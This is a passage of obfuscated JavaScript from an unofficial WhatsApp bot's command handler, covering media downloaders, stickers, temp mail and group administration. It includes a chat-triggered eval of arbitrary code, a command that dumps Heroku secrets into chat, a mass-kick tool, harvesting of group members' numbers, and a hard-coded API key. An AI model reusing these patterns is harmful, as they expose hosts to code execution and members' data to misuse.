              if (!_0xca7ad5.quoted.text) {
                throw "qoute a text";
              }
              let _0x50b333 = _0xca7ad5.quoted.text;
              const {
                quote: _0x289561
              } = require("./lib/viniziazquotely.js");
              let _0x10650a = await _0x398b1a.profilePictureUrl(_0xca7ad5.sender, "image")["catch"](_0x39c185 => "https://telegra.ph/file/75272825615a4dcb69526.png");
              const _0x3e2b9a = await _0x289561(_0x50b333, _0x466e42, _0x10650a);
              _0x398b1a.sendImageAsSticker(_0xca7ad5.chat, _0x3e2b9a.result, _0xca7ad5, {
                'packname': _0x466e42,
                'author': 'VINIZIAZ-XMD'
              });
            } catch (_0x36a7bb) {
              await _0x1d37a1("Qoute some text for quotely");
            }
          }
          break;
        case 'fullpp':
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            const {
              S_WHATSAPP_NET: _0x21f089
            } = require("@whiskeysockets/baileys");
            try {
              const _0x48d285 = require('fs');
              if (!_0x4db425) {
                _0xca7ad5.reply("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲...");
                return;
              }
              ;
              let _0x12a417;
              if (_0x4db425.imageMessage) {
                _0x12a417 = _0x4db425.imageMessage;
              } else {
                _0xca7ad5.reply("𝗛𝘂𝗵 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲...");
                return;
              }
              ;
              var _0x26804f = await _0x398b1a.downloadAndSaveMediaMessage(_0x12a417);
              var {
                img: _0x3a34ce
              } = await generateProfilePicture(_0x26804f);
              _0x398b1a.query({
                'tag': 'iq',
                'attrs': {
                  'target': undefined,
                  'to': _0x21f089,
                  'type': "set",
                  'xmlns': 'w:profile:picture'
                },
                'content': [{
                  'tag': "picture",
                  'attrs': {
                    'type': "image"
                  },
                  'content': _0x3a34ce
                }]
              });
              _0x48d285.unlinkSync(_0x26804f);
              _0xca7ad5.reply("𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗽𝗶𝗰𝘁𝘂𝗿𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆✅");
            } catch (_0x4e0667) {
              _0xca7ad5.reply("An error occured while updating profile photo\n" + _0x4e0667);
            }
          }
          break;
        case "upload":
        case 'url':
          {
            let _0x5ec132 = _0xca7ad5.quoted ? _0xca7ad5.quoted : _0xca7ad5;
            let _0xa376c5 = (_0x5ec132.msg || _0x5ec132).mimetype || '';
            if (!_0xa376c5) {
              return _0xca7ad5.reply("Quote an image or video");
            }
            let _0x2f576c = await _0x5ec132.download();
            if (_0x2f576c.length > 10485760) {
              return _0xca7ad5.reply("Media is too large.");
            }
            let _0x4e0146 = /image\/(png|jpe?g|gif)|video\/mp4/.test(_0xa376c5);
            if (_0x4e0146) {
              let _0x2d11b7 = await _0x398b1a.downloadAndSaveMediaMessage(_0x5ec132);
              let _0xaabb2b = await uploadtoimgur(_0x2d11b7);
              _0xca7ad5.reply("Media Link:-\n\n" + _0xaabb2b);
            } else {
              _0xca7ad5.reply("Error occured...");
            }
          }
          break;
        case 'attp':
          if (!q) {
            return _0x1d37a1("I need text;");
          }
          _0x398b1a.sendMessage(_0xca7ad5.chat, {
            'sticker': {
              'url': 'https://api.lolhuman.xyz/api/attp?apikey=cde5404984da80591a2692b6&text=' + q
            }
          }, {
            'quoted': _0xca7ad5
          });
          break;
        case "smeme":
          {
            if (!/image/.test(_0x372f6b)) {
              return _0x1d37a1("Quote an image or sticker with the 2 texts separated with |");
            }
            if (!_0x32c5b4) {
              return _0x1d37a1("Quote an image or sticker with the 2 texts separated with |");
            }
            atas = _0x32c5b4.split('|')[0x0] ? _0x32c5b4.split('|')[0x0] : '-';
            bawah = _0x32c5b4.split('|')[0x1] ? _0x32c5b4.split('|')[0x1] : '-';
            let _0x5c4f5c = await _0x398b1a.downloadAndSaveMediaMessage(_0x459ea4);
            let _0x54b532 = await uploadtoimgur(_0x5c4f5c);
            let _0x30b911 = 'https://api.memegen.link/images/custom/' + encodeURIComponent(bawah) + '/' + encodeURIComponent(atas) + ".png?background=" + _0x54b532;
            let _0x18abe3 = await _0x398b1a.sendImageAsSticker(_0xca7ad5.chat, _0x30b911, _0xca7ad5, {
              'packname': packname
            });
            fs.unlinkSync(_0x18abe3);
          }
          break;
        case "compile-c":
          if (!_0x32c5b4 && !_0xca7ad5.quoted) {
            throw "Quote/tag a C code to compile";
          }
          const _0x298808 = _0xca7ad5.quoted ? _0xca7ad5.quoted.text ? _0xca7ad5.quoted.text : _0x32c5b4 ? _0x32c5b4 : _0xca7ad5.text : _0xca7ad5.text;
          let _0x4ba9d9 = c.runSource(_0x298808);
          _0x4ba9d9.then(_0x28ae9b => {
            console.log(_0x28ae9b);
            _0x1d37a1(_0x28ae9b.stdout);
            _0x1d37a1(_0x28ae9b.stderr);
          })["catch"](_0x5814b9 => {
            console.log(resultt3.stderr);
            _0x1d37a1(resultt3.stderr);
          });
          break;
        case "compile-c++":
          if (!_0x32c5b4 && !_0xca7ad5.quoted) {
            throw "Quote/tag a C++ code to compile";
          }
          const _0x3385f0 = _0xca7ad5.quoted ? _0xca7ad5.quoted.text ? _0xca7ad5.quoted.text : _0x32c5b4 ? _0x32c5b4 : _0xca7ad5.text : _0xca7ad5.text;
          let _0x4444aa = cpp.runSource(_0x3385f0);
          _0x4444aa.then(_0x4a8f72 => {
            console.log(_0x4a8f72);
            _0x1d37a1(_0x4a8f72.stdout);
            _0x1d37a1(_0x4a8f72.stderr);
          })["catch"](_0x23f0b7 => {
            console.log(resultt4.stderr);
            _0x1d37a1(resultt4.stderr);
          });
          break;
        case "eval":
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            if (!_0x32c5b4) {
              throw "Provide a valid Bot Baileys Function to evaluate";
            }
            try {
              let _0x2d440a = await eval(_0x10ef13.slice(0x2));
              if (typeof _0x2d440a !== "string") {
                _0x2d440a = require("util").inspect(_0x2d440a);
              }
              await _0x1d37a1(_0x2d440a);
            } catch (_0x3989d4) {
              await _0x1d37a1(String(_0x3989d4));
            }
          }
          break;
        case "add":
          if (!_0x32c5b4) {
            return _0x1d37a1("provide a number to be added in this format. \n\n add 254759925133");
          }
          if (!_0xca7ad5.isGroup) {
            throw group;
          }
          if (!_0x396ea3) {
            throw admin;
          }
          if (!_0x59fea5) {
            throw botAdmin;
          }
          await _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, [_0x32c5b4], "add");
          _0x1d37a1("succesfully added");
          break;
        case "kill":
        case 'kickall':
        case "terminate":
          if (!_0xca7ad5.isGroup) {
            throw group;
          }
          if (!_0x59fea5) {
            throw "I need admin previlleges to execute this command.";
          }
          if (!_0x11f3a8) {
            throw "Only VINIZIAZ-XMD owner can use this command😲!";
          }
          let _0x45f541 = _0x35f297.filter(_0x6ecc48 => _0x6ecc48.id != _0x398b1a.decodeJid(_0x398b1a.user.id)).map(_0x2e0472 => _0x2e0472.id);
          _0xca7ad5.reply("⚠️ Initializing Kick-all command💀...");
          setTimeout(() => {
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'text': "All parameters are configured, and Kick-all has been initialized and confirmed!. Now, Raven will remove all " + _0x45f541.length + " group participants in the next second.\n\nGoodbye Everyone! 👋\n\nTHIS PROCESS CANNOT BE TERMINATED💀!"
            }, {
              'quoted': _0xca7ad5
            });
            setTimeout(() => {
              _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, _0x45f541, "remove");
              setTimeout(() => {
                _0xca7ad5.reply("Done✅. All group participants have been removed. Do not always use this command to avoid Wa bans!");
              }, 0x3e8);
            }, 0x3e8);
          }, 0x3e8);
          break;
        case "system":
          _0x398b1a.sendMessage(_0xca7ad5.chat, {
            'image': {
              'url': "https://i.imgur.com/PwXxe8q.jpeg"
            },
            'caption': "*𝐁𝐎𝐓 𝐍𝐀𝐌𝐄: 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗*\n\n*𝐒𝐏𝐄𝐄𝐃: " + _0x1df034.toFixed(0x4) + " 𝐌𝐒*\n\n*𝐑𝐔𝐍𝐓𝐈𝐌𝐄: " + runtime(process.uptime()) + "*\n\n*𝐏𝐋𝐀𝐓𝐅𝐎𝐑𝐌: 𝗛𝗲𝗿𝗼𝗸𝘂*\n\n*𝐇𝐎𝐒𝐓𝐍𝐀𝐌𝐄: 𝗩𝗶𝗻𝗶𝘇𝗶𝗮𝘇*\n\n*𝐋𝐈𝐁𝐑𝐀𝐑𝐘: Baileys*\n\n𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑: 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭"
          });
          break;
        case 'vcf':
        case "group-vcf":
          {
            if (!_0xca7ad5.isGroup) {
              return _0xca7ad5.reply("Command meant for groups");
            }
            const _0x1f34eb = require('fs');
            let _0x51f0bd = await _0x398b1a.groupMetadata(_0xca7ad5.chat);
            let _0x2503ce = '';
            let _0x4ba0a9 = 0x0;
            for (let _0x204e6d of _0x51f0bd.participants) {
              _0x2503ce += "BEGIN:VCARD\nVERSION:3.0\nFN:[" + _0x4ba0a9++ + "] +" + _0x204e6d.id.split('@')[0x0] + "\nTEL;type=CELL;type=VOICE;waid=" + _0x204e6d.id.split('@')[0x0] + ':+' + _0x204e6d.id.split('@')[0x0] + "\nEND:VCARD\n";
            }
            await _0xca7ad5.reply("𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝐕𝐈𝐍𝐈𝐙𝐈𝐀𝐙-𝐗𝐌𝐃 𝗶𝘀 𝗖𝗼𝗺𝗽𝗶𝗹𝗶𝗻𝗴 " + _0x51f0bd.participants.length + " 𝗖𝗼𝗻𝘁𝗮𝗰𝘁𝘀 𝗶𝗻𝘁𝗼 𝗮 𝗩𝗰𝗳...");
            await _0x1f34eb.writeFileSync("./contacts.vcf", _0x2503ce.trim());
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'document': _0x1f34eb.readFileSync("./contacts.vcf"),
              'mimetype': "text/vcard",
              'fileName': "Group contacts.vcf",
              'caption': "VCF for " + _0x51f0bd.subject + "\n" + _0x51f0bd.participants.length + " contacts"
            }, {
              'ephemeralExpiration': 0x15180,
              'quoted': _0xca7ad5
            });
            _0x1f34eb.unlinkSync("./contacts.vcf");
          }
          break;
        case "faker":
          if (!_0xca7ad5.isGroup) {
            throw group;
          }
          if (!_0x59fea5) {
            throw botAdmin;
          }
          if (!_0x396ea3) {
            throw admin;
          }
          let _0x744655 = _0x35f297.filter(_0x5e4c2e => !_0x5e4c2e.admin).map(_0x4fa591 => _0x4fa591.id).filter(_0x5dc731 => _0x5dc731.startsWith('1') && _0x5dc731 != _0x398b1a.decodeJid(_0x398b1a.user.id));
          if (!_0x4dd883 || !_0x4dd883[0]) {
            if (_0x744655.length == 0) {
              return _0x1d37a1("No virtual numbers detected!");
            }
            _0xca7ad5.reply("Raven has detected " + _0x744655.length + " members using +1 fake virtual WhatsApp accounts.  To remove them send faker -x");
          } else if (_0x4dd883[0] == '-x') {
            await _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, [_0x744655], "remove");
            await _0xca7ad5.reply(_0x744655.length + " +1 fake accounts successfully removed!");
          }
          break;
        case "mail":
          {
            const {
              TempMail: _0x4fc043
            } = require('tempmail.lol');
            const _0x351b55 = new _0x4fc043();
            const _0xdeb607 = await _0x351b55.createInbox();
            const _0x469256 = '' + _0xdeb607.address;
            await _0xca7ad5.reply(_0x469256);
            const _0x5cc6a7 = await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'text': '' + _0xdeb607.token
            });
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'text': "Quoted text is your token. To fetch messages in your email use <.inbox your-token>"
            }, {
              'quoted': _0x5cc6a7
            });
          }
          break;
        case 'hacker2':
          {
            if (!/image/.test(_0x372f6b)) {
              return _0xca7ad5.reply("Hello hacker 👋, quote an image, probably a clear image of yourself or a person.");
            }
            let _0x2b1daf = await _0x398b1a.downloadAndSaveMediaMessage(_0x459ea4);
            const _0x1e298d = await uploadtoimgur(_0x2b1daf);
            await UploadFileUgu();
            const _0x16bf15 = "https://aemt.me/hacker2?link=" + _0x1e298d;
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'image': {
                'url': _0x16bf15
              },
              'caption': "Converted by Raven! 🦄"
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "inbox":
          {
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("To fetch messages from your mail, provide the email address which was issued.");
            }
            const _0x4ecca9 = encodeURIComponent(_0x32c5b4);
            const _0x3f8090 = "https://tempmail.apinepdev.workers.dev/api/getmessage?email=" + _0x4ecca9;
            try {
              const _0x4d60af = await fetch(_0x3f8090);
              if (!_0x4d60af.ok) {
                return _0xca7ad5.reply(_0x4d60af.status + " error occurred while communicating with API.");
              }
              const _0x91929a = await _0x4d60af.json();
              if (!_0x91929a || !_0x91929a.messages) {
                return _0xca7ad5.reply("I am unable to fetch messages from your mail, your inbox might be empty or some other error occurred.");
              }
              const _0x32dbed = _0x91929a.messages;
              for (const _0x4938bb of _0x32dbed) {
                const _0x2e04e6 = _0x4938bb.sender;
                const _0x485136 = _0x4938bb.subject;
                const _0x259977 = new Date(JSON.parse(_0x4938bb.message).date).toLocaleString();
                const _0x3ee6ea = JSON.parse(_0x4938bb.message).body;
                const _0x2be9f3 = "👥 Sender: " + _0x2e04e6 + "\n📝 Subject: " + _0x485136 + "\n🕜 Date: " + _0x259977 + "\n📩 Message: " + _0x3ee6ea;
                await _0xca7ad5.reply(_0x2be9f3);
              }
            } catch (_0x13105f) {
              console.error("𝗢𝗼𝗽𝘀 𝗘𝗿𝗿𝗼𝗿!");
              return _0xca7ad5.reply("𝗦𝗼𝗺𝗲𝘁𝗵𝗶𝗻𝗴 𝗶𝘀 𝘄𝗿𝗼𝗻𝗴!");
            }
          }
          break;
        case "anime":
        case "random-anime":
          {
            const _0x25c621 = require("axios");
            try {
              const _0x397c14 = await _0x25c621.get("https://api.jikan.moe/v4/random/anime");
              const _0x5d8504 = _0x397c14.data.data;
              const _0x1c8e6b = _0x5d8504.title;
              const _0x29d6c1 = _0x5d8504.synopsis;
              const _0x1f0ea8 = _0x5d8504.images.jpg.image_url;
              const _0x4c3508 = _0x5d8504.episodes;
              const _0x28b630 = _0x5d8504.status;
              const _0x5b6086 = "📺 Title: " + _0x1c8e6b + "\n🎬 Épisodes: " + _0x4c3508 + "\n📡 Status: " + _0x28b630 + "\n📝 Synopsis: " + _0x29d6c1 + "\n🔗 URL: " + _0x5d8504.url;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x1f0ea8
                },
                'caption': _0x5b6086
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x1ad14d) {
              _0xca7ad5.reply("𝗢𝗼𝗽𝘀 𝗘𝗿𝗿𝗼𝗿!");
            }
          }
          break;
        case "news":
          {
            const _0x54d048 = await fetch("https://fantox001-scrappy-api.vercel.app/technews/random");
            const _0x1d997f = await _0x54d048.json();
            const {
              thumbnail: _0x66814,
              news: _0x55ead2
            } = _0x1d997f;
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'image': {
                'url': _0x66814
              },
              'caption': _0x55ead2
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case 'approve':
        case "approve-all":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            const _0x6c50ae = await _0x398b1a.groupRequestParticipantsList(_0xca7ad5.chat);
            if (_0x6c50ae.length === 0x0) {
              return _0xca7ad5.reply("𝗛𝘂𝗵, 𝗡𝗼 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗷𝗼𝗶𝗻 𝗿𝗲𝗾𝘂𝗲𝘀𝘁𝘀 𝘁𝗵𝗶𝘀 𝘁𝗶𝗺𝗲!");
            }
            for (const _0x378590 of _0x6c50ae) {
              const _0x4faa4c = await _0x398b1a.groupRequestParticipantsUpdate(_0xca7ad5.chat, [_0x378590.jid], "approve");
              console.log(_0x4faa4c);
            }
            _0xca7ad5.reply("𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 ℎ𝑎𝑠 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 𝑎𝑙𝑙 𝑡ℎ𝑒 𝑝𝑒𝑛𝑑𝑖𝑛𝑔 𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠 𝑠𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙𝑙𝑦 ✅");
          }
          break;
        case 'reject':
        case "reject-all":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            const _0x1e5c52 = await _0x398b1a.groupRequestParticipantsList(_0xca7ad5.chat);
            if (_0x1e5c52.length === 0x0) {
              return _0xca7ad5.reply("𝗛𝘂𝗵, 𝗡𝗼 𝗽𝗲𝗻𝗱𝗶𝗻𝗴 𝗷𝗼𝗶𝗻 𝗿𝗲𝗾𝘂𝗲𝘀𝘁𝘀 𝘁𝗵𝗶𝘀 𝘁𝗶𝗺𝗲");
            }
            for (const _0x557794 of _0x1e5c52) {
              const _0x109ee3 = await _0x398b1a.groupRequestParticipantsUpdate(_0xca7ad5.chat, [_0x557794.jid], "reject");
              console.log(_0x109ee3);
            }
            _0xca7ad5.reply("𝑃𝑒𝑛𝑑𝑖𝑛𝑔 𝑝𝑎𝑟𝑡𝑖𝑐𝑖𝑝𝑎𝑛𝑡𝑠 ℎ𝑎𝑣𝑒 𝑏𝑒𝑒𝑛 𝑟𝑒𝑗𝑒𝑐𝑡𝑒𝑑!");
          }
          break;
        case "admin":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            await _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, [_0xca7ad5.sender], "promote");
            _0xca7ad5.reply("Promoted To Admin<🥇");
          }
          break;
        case "getvar":
          if (!_0x11f3a8) {
            throw NotOwner;
          }
          const _0x4d9625 = new _0x51a63d({
            'token': herokuapi
          });
          let _0x24d975 = "/apps/" + appname;
          let _0x3506aa = await _0x4d9625.get(_0x24d975 + "/config-vars");
          let _0x24d107 = "*𝗕𝗲𝗹𝗼𝘄 𝗔𝗿𝗲 𝗛𝗲𝗿𝗼𝗸𝘂 𝗩𝗮𝗿𝗶𝗮𝗯𝗹𝗲𝘀 𝗙𝗼𝗿 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗:*\n\n";
          for (vrt in _0x3506aa) {
            _0x24d107 += vrt + '=' + _0x3506aa[vrt] + "\n\n";
          }
          _0x1d37a1(_0x24d107);
          break;
        case "restart":
          if (!_0x11f3a8) {
            throw NotOwner;
          }
          _0x1d37a1("𝐕𝐈𝐍𝐈𝐙𝐈𝐀𝐙-𝐗𝐌𝐃 𝐢𝐬 𝐫𝐞𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠. . .");
          await sleep(0xbb8);
          process.exit();
          break;
        case "remove":
        case "kick":
        case "toka":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0xca7ad5.quoted && (!_0xca7ad5.mentionedJid || _0xca7ad5.mentionedJid.length === 0x0)) {
              return _0xca7ad5.reply("Who should i remove !?");
            }
            let _0x3b48ac = _0xca7ad5.mentionedJid[0x0] ? _0xca7ad5.mentionedJid[0x0] : _0xca7ad5.quoted ? _0xca7ad5.quoted.sender : null;
            const _0x60845 = _0x3b48ac.split('@')[0x0];
            if (_0x3b48ac == "254759925133@s.whatsapp.net") {
              return _0xca7ad5.reply("It's an Owners Number and he is dating😂");
            }
            if (_0x3b48ac == _0x398b1a.decodeJid(_0x398b1a.user.id)) {
              throw "I cannot remove Myself 😂";
            }
            _0xca7ad5.reply('@' + _0x60845 + " Goodbye🖕");
            await _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, [_0x3b48ac], "remove");
          }
          break;
        case 'instagram':
        case "igdl":
        case 'ig':
          {
            const {
              igdl: _0x391b3d
            } = require("ruhend-scraper");
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("Please provide an Instagram link for the video.");
            }
            if (!_0x32c5b4.includes("https://www.instagram.com/")) {
              return _0xca7ad5.reply("That is not a valid Instagram link.");
            }
            try {
              const _0x3f8074 = await _0x391b3d(_0x32c5b4);
              if (!_0x3f8074 || !_0x3f8074.data || _0x3f8074.data.length === 0x0) {
                return _0xca7ad5.reply("No video found at the provided link.");
              }
              const _0x848361 = _0x3f8074.data;
              for (let _0x3ac3b1 = 0x0; _0x3ac3b1 < Math.min(0x14, _0x848361.length); _0x3ac3b1++) {
                const _0x578c25 = _0x848361[_0x3ac3b1];
                const _0x4190ce = _0x578c25.url;
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'video': {
                    'url': _0x4190ce
                  },
                  'mimetype': "video/mp4",
                  'caption': "DOWNLOADED BY " + botname
                }, {
                  'quoted': _0xca7ad5
                });
              }
            } catch (_0x31993d) {
              console.error(_0x31993d);
              return _0xca7ad5.reply("An error occurred while processing the request.");
            }
          }
          break;
        case "twitter":
        case "twtdl":
          {
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝘁𝘄𝗶𝘁𝘁𝗲𝗿 𝗹𝗶𝗻𝗸 !");
            }
            try {
              const _0x3d4036 = await fetchJson("https://api.dreaded.site/api/alldl?url=" + _0x32c5b4);
              if (!_0x3d4036 || _0x3d4036.status !== 0xc8 || !_0x3d4036.data || !_0x3d4036.data.videoUrl) {
                return _0xca7ad5.reply("𝗦𝗼𝗿𝗿𝘆 𝘁𝗵𝗲 𝗔𝗣𝗜 𝗱𝗶𝗱𝗻'𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝗱 𝗰𝗼𝗿𝗿𝗲𝗰𝘁𝗹𝘆. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗔𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿!");
              }
              const _0x3c9101 = _0x3d4036.data.videoUrl;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'video': {
                  'url': _0x3c9101
                },
                'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗥𝗔𝗩𝗘𝗡-𝗕𝗢𝗧",
                'gifPlayback': false
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x27aa79) {
              _0xca7ad5.reply("An error occured. API might be down\n" + _0x27aa79);
            }
          }
          break;
        case "facebook":
        case 'fb':
        case "fbdl":
          {
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗳𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗹𝗶𝗻𝗸 !");
            }
            if (!_0x32c5b4.includes("facebook.com")) {
              return _0xca7ad5.reply("That is not a facebook link.");
            }
            try {
              let _0x123d19 = await fetchJson("https://api.dreaded.site/api/facebook?url=" + _0x32c5b4);
              if (!_0x123d19 || _0x123d19.status !== 0xc8 || !_0x123d19.facebook || !_0x123d19.facebook.sdVideo) {
                return _0xca7ad5.reply("𝗦𝗼𝗿𝗿𝘆 𝘁𝗵𝗲 𝗔𝗣𝗜 𝗱𝗶𝗱𝗻'𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝗱 𝗰𝗼𝗿𝗿𝗲𝗰𝘁𝗹𝘆. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗔𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿!");
              }
              const _0x403428 = _0x123d19.facebook.sdVideo;
              if (!_0x403428) {
                return _0xca7ad5.reply("Wrong facebook data. Please ensure the video exists.");
              }
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'video': {
                  'url': _0x403428
                },
                'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗",
                'gifPlayback': false
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x131505) {
              console.error("Error occurred:", _0x131505);
              _0xca7ad5.reply("An error occurred. API might be down. Error: " + _0x131505.message);
            }
          }
          break;
        case "tiktok":
        case "tikdl":
          {
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("Please provide a TikTok video link.");
            }
            try {
              const _0x2530cb = await axios.get("https://bk9.fun/download/tiktok?url=" + encodeURIComponent(_0x32c5b4));
              if (_0x2530cb.data.status && _0x2530cb.data.BK9) {
                const _0x2f0772 = _0x2530cb.data.BK9.BK9;
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'text': "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝐹𝑒𝑡𝑐ℎ𝑒𝑑 𝑑𝑎𝑡𝑎 𝑠𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙𝑙𝑦✅ 𝑤𝑎𝑖𝑡 𝑎 𝑚𝑜𝑚𝑒𝑛𝑡. . ."
                }, {
                  'quoted': _0xca7ad5
                });
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'video': {
                    'url': _0x2f0772
                  },
                  'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗",
                  'gifPlayback': false
                }, {
                  'quoted': _0xca7ad5
                });
              } else {
                _0x1d37a1("Failed to retrieve video from the provided link.");
              }
            } catch (_0x32cf3b) {
              _0x1d37a1("An error occurred during download: " + _0x32cf3b.message);
            }
          }
          break;
        case "song":
          {
            const _0x28f6b6 = require('yt-search');
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("What song do you want to download?");
              }
              const {
                videos: _0x2b3951
              } = await _0x28f6b6(_0x32c5b4);
              if (!_0x2b3951 || _0x2b3951.length === 0x0) {
                return _0xca7ad5.reply("No songs found!");
              }
              await _0xca7ad5.reply("_Please wait your download is in progress_");
              const _0xf64bb3 = _0x2b3951[0x0].url;
              let _0x346d75 = await fetchJson("https://api.dreaded.site/api/ytdl/audio?url=" + _0xf64bb3);
              if (!_0x346d75 || !_0x346d75.result || !_0x346d75.result.url) {
                return _0xca7ad5.reply("Failed to fetch audio from the API.");
              }
              const _0x563897 = _0x346d75.result.url;
              const _0x30c3f2 = _0x346d75.result.title;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'audio': {
                  'url': _0x563897
                },
                'mimetype': "audio/mpeg",
                'fileName': _0x30c3f2 + ".mp3"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x138ed2) {
              _0xca7ad5.reply("Download failed\n" + _0x138ed2.message);
            }
          }
          break;
        case 'sc':
        case "script":
        case 'repo':
          _0x398b1a.sendMessage(_0xca7ad5.chat, {
            'image': {
              'url': "https://i.imgur.com/HP6GyiD.jpeg"
            },
            'caption': " Hello👋 *" + _0x466e42 + "*,You can deploy 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 using the GitHub link below 𓅂\n\nFork and give us a star✨.\n\n https://github.com/Viniznimco/VINIZIAZ-XMD\n\nLink with your whatsapp using pairing link below\n\nhttps://msnapdragon-junior.onrender.com/\n\nCopy the session_id and Fill in the required Variables before Deploy\n\nEnjoy and have fun with ░𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗░\n\n𝗠𝗮𝗱𝗲 𝗶𝗻 𝗞𝗲𝗻𝘆𝗮 𝗯𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭!\n\n𝗜𝗳 𝘆𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝗯𝗲 𝗱𝗲𝗽𝗹𝗼𝘆𝗲𝗱 𝘁𝗲𝘅𝘁 𝗺𝗲 𝗼𝗻 +254759925133 𝗼𝗿 𝘁𝗲𝘅𝘁 𝘆𝗼𝘂𝗿 𝗳𝗮𝘃𝗼𝘂𝗿𝗶𝘁𝗲 𝗱𝗲𝗽𝗹𝗼𝘆𝗲𝗿\n\n© 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭 "
          }, {
            'quoted': _0xca7ad5
          });
          break;
        case "closetime":
          if (!_0xca7ad5.isGroup) {
            throw group;
          }
          if (!_0x396ea3) {
            throw admin;
          }
          if (!_0x59fea5) {
            throw botAdmin;
          }
          if (_0x4dd883[0x1] == "second") {
            var _0xb23c32 = _0x4dd883[0x0] * "1000";
          } else {
            if (_0x4dd883[0x1] == 'minute') {
              var _0xb23c32 = _0x4dd883[0x0] * '60000';
            } else {
              if (_0x4dd883[0x1] == "hour") {
                var _0xb23c32 = _0x4dd883[0x0] * "3600000";
              } else {
                if (_0x4dd883[0x1] == "day") {
                  var _0xb23c32 = _0x4dd883[0x0] * "86400000";
                } else {
